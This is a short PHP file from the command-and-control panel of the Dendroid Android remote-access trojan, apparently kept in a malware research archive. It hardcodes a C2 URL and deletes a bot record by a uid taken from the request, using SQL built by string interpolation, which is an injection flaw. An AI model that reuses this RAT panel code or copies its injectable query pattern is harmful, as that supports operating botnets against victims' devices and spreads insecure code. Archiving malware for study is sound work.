/*
  name      Dendroid
  type      android
  cve       —
  year      unknown
  os        Android
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?php
  $url = "http://pizzachip.com/rat/";

  if (file_exists("config.php")) {
    include("config.php");
  } else {
    die();
  }
  
  include("functions.php");
  
  $botid = $_GET['uid'];
  
  if (empty($botid)){
    die();
  }
  
  echo $botid;

  $statement = $connect->prepare("DELETE FROM bots WHERE uid='$botid'");
  $statement->execute();
  echo "Bot Deleted";
?>